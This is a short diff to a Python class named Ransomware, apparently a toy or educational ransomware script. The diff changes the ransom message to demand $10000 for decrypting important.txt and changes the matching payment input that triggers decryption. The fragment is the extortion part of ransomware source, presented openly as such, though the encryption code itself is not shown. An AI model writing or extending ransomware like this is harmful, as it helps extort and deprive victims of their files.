@@ -114,12 +114,12 @@ class Ransomware:
             print(f"Error: {e}")
             return
 
-        print("give me money")
+        print("Your file important.txt is encrypted. To decrypt it, you need to pay me $10000 and send key_cipher.txt to me!")
 
         while True:
             try:
                 line = input(f"HihiHaha: ")
-                if (line == "$500"):
+                if (line == "$10000"):
                     self.__reverse_ransom()
                     break
             except KeyboardInterrupt:
